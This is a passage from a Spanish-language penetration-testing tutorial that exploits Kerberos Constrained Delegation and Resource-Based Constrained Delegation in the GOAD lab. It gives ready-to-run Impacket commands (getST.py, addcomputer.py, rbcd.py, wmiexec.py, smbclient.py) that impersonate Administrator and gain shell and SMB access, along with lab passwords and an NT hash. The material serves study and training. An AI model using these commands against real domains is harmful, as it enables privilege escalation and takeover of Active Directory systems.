![Obtención de TGS con S4U](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-34.avif)

Cuando ya tenemos un TGS reenviable, podemos hacer uso de S4UProxy para pedirlo en WINTERFELL$. Asimismo, hacemos uso de lo mencionado en [evasión del msDS-AllowedToDelegateTo](#evasión-del-msds-allowedtodelegateto) para modificar el servicio destino en WINTERFELL$ y que no sea HTTP como está originalmente establecido en el Constrained Delegation:

```bash
getST.py -impersonate "administrator" -spn "http/winterfell" -altservice "cifs/winterfell" -additional-ticket 'Administrator@host_castelblack@NORTH.SEVENKINGDOMS.LOCAL.ccache' -dc-ip 192.168.50.11 -hashes ':98d47d3d7e5be6ad987e05716fe42e14' north.sevenkingdoms.local/'castelblack$'
```

![TGS para CIFS de WINTERFELL](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-35.avif)

Con esto, acabamos de conseguir un TGS para el servicio CIFS de WINTERFELL$ como Administrator. Podemos hacer uso de él añadiéndolo a la variable de entorno KRB5CCNAME. Una vez añadido, podemos usar lo que queramos siempre y cuando tengamos acceso con el servicio CIFS:

```bash
export KRB5CCNAME=/home/draco_0x6ba/administrator@cifs_winterfell@NORTH.SEVENKINGDOMS.LOCAL.ccache

wmiexec.py -k -no-pass north.sevenkingdoms.local/administrator@winterfell
```

![Uso del TGS con wmiexec](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-36.avif)

![Shell como Administrator en WINTERFELL](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-37.avif)

###### Con Transición de Protocolo

Ya hemos visto cómo sería la explotación sin Transición de Protocolo, vamos a ver ahora cómo sería cuando esta característica está habilitada:

![Constrained Delegation con Protocol Transition](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-38.avif)

En este caso, el usuario jon.snow posee Constrained Delegation con Transición de Protocolo y tiene configurado el servicio CIFS de WINTERFELL$.

En esta situación, no hay que liar nada usando RBCD como en el anterior caso. Como de manera por defecto, ya podemos hacer uso de S4U2Self por la Transición de Protocolo, pues, con un simple comando podemos obtener un TGS para el servicio que queramos de WINTERFELL$:

```bash
getST.py -spn 'CIFS/winterfell' -impersonate Administrator -dc-ip '192.168.50.11' 'north.sevenkingdoms.local/jon.snow:iknownothing'
```

![TGS con Protocol Transition](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-39.avif)

En este caso lo hemos pedido para el propio CIFS. Si quisiésemos otro servicio simplemente habría que hacer uso del argumento -altservice:

```bash
getST.py -spn 'CIFS/winterfell' -impersonate Administrator -altservice 'HOST/winterfell' -dc-ip '192.168.50.11' 'north.sevenkingdoms.local/jon.snow:iknownothing'
```

![TGS con altservice](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-40.avif)

Sea lo que sea, una vez tenemos el TGS hacemos lo mismo que antes, establecemos la variable de entorno KRB5CCNAME, y usamos el ticket:

```bash
export KRB5CCNAME=/home/draco_0x6ba/Administrator@CIFS_winterfell@NORTH.SEVENKINGDOMS.LOCAL.ccache

smbclient.py -k -no-pass north.sevenkingdoms.local/administrator@winterfell
```

![Acceso SMB a WINTERFELL](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-41.avif)

Y de esta manera habremos explotado un Constrained Delegation con Transición de Protocolo :)

#### Resource-Based Constrained Delegation

Por último pero no menos importante, vamos a explotar el RBCD :)

Su explotación es parecida al primer caso del Constrained Delegation. La situación que vamos a explotar es la siguiente:

![Situación RBCD a explotar](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-42.avif)

Los requisitos para esta explotación son los mismos que en el Constrained Delegation sin Transición de Protocolo:

- Una cuenta en el dominio (que nos servirá para agregar una cuenta de ordenador)
- Cuenta de máquina del equipo de KINGSLANDING$, o por el contrario, una cuenta de dominio que tenga los privilegios suficientes como para poder editar el campo msDS-AllowedToActOnBehalfOfOtherIdentity de KINGSLANDING$ (es decir, permisos GenericAll, GenericWrite o WriteProperty en KINGSLANDING$)

En este caso, vamos a ver el segundo ejemplo del segundo requisito. Tenemos la cuenta stannis.baratheon la cual tiene permisos GenericAll en KINGSLANDING$.

Lo primero de todo, será agregar una cuenta de equipo, usando el usuario de stannis.baratheon:

```bash
addcomputer.py -computer-name 'rbcd$' -computer-pass 'rbcdpass' -dc-host kingslanding.sevenkingdoms.local 'sevenkingdoms.local/stannis.baratheon:Drag0nst0ne'
```

![Creación de cuenta de equipo para RBCD](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-43.avif)

Una vez tenemos ya una cuenta de equipo agregada, la idea es aprovechar el permiso de GenericAll que tenemos en KINGSLANDING$ para agregar al campo msDS-AllowedToActOnBehalfOfOtherIdentity la cuenta de equipo que acabamos de crear.

```bash
rbcd.py -delegate-from 'rbcd$' -delegate-to 'kingslanding$' -dc-ip 'kingslanding.sevenkingdoms.local' -action 'write' sevenkingdoms.local/stannis.baratheon:Drag0nst0ne
```

![Configuración RBCD en KINGSLANDING](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-44.avif)

Una vez tenemos configurado el RBCD gracias a la ACL de GenericAll podemos hacer uso de S4U2Self y S4U2Proxy para pedir un TGS de Administrator en KINGSLANDING$:

```bash
getST.py -spn 'CIFS/kingslanding' -impersonate Administrator -dc-ip 'kingslanding.sevenkingdoms.local' 'sevenkingdoms.local/rbcd$:rbcdpass'
```

![TGS como Administrator en KINGSLANDING](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-45.avif)

Teniendo el TGS del servicio CIFS de KINGSLANDING$, ya podemos hacer lo mismo de siempre:

```bash
export KRB5CCNAME=/home/draco_0x6ba/Administrator@CIFS_kingslanding@SEVENKINGDOMS.LOCAL.ccache

smbclient.py -k -no-pass sevenkingdoms.local/administrator@kingslanding
```

![Acceso SMB a KINGSLANDING](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-46.avif)

Y de esta manera, habremos explotado un RBCD.

## Artículos interesantes (pero no mejores que este, obvio)

- Constrained Delegation
    - [Trust? Years to earn, seconds to break - WithSecure Labs](https://labs.withsecure.com/publications/trust-years-to-earn-seconds-to-break)
    - [S4U2Pwnage - harmj0y](https://blog.harmj0y.net/activedirectory/s4u2pwnage/)
    - [Another Word on Delegation - harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
    - [Delegate to the Top - Abusing Kerberos for Arbitrary Impersonations and RCE - Blackhat Asia 2017](https://www.blackhat.com/docs/asia-17/materials/asia-17-Hart-Delegate-To-The-Top-Abusing-Kerberos-For-Arbitrary-Impersonations-And-RCE.pdf)
- Resource-Based Constrained Delegation
    - [Wagging the Dog: Abusing Resource-Based Constrained Delegation - Shenanigans Labs](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#generic-dacl-abuse)
    - [A Case Study in Wagging the Dog: Computer Takeover - harmj0y](https://blog.harmj0y.net/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/)
    - [Kerberos RBCD: When an Image Change Leads to a Privilege Escalation - NCC Group](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

Y quien para ambos casos, quiera ver todo el proceso visto en este artículo a bajo nivel (ver paquetes con Wireshark, etc etc) debe de ver la charla/slides de 4TTL4S de su charla **You do (not) Understand Kerberos Delegation**:

- [Blog de 4TTL4S](https://attl4s.github.io/)

## Referencias

- [Kerberos (III): ¿Cómo funciona la delegación? - Tarlogic](https://www.tarlogic.com/es/blog/kerberos-iii-como-funciona-la-delegacion/#Constrained_Delegation_y_RBCD)
- [Kerberos Delegation - hackndo](https://en.hackndo.com/constrained-unconstrained-delegation/)
- [GOAD - part 10 - Delegations - Mayfly](https://mayfly277.github.io/posts/GOADv2-pwning-part10/)
- [Delegations - The Hacker Recipes](https://www.thehacker.recipes/a-d/movement/kerberos/delegations)
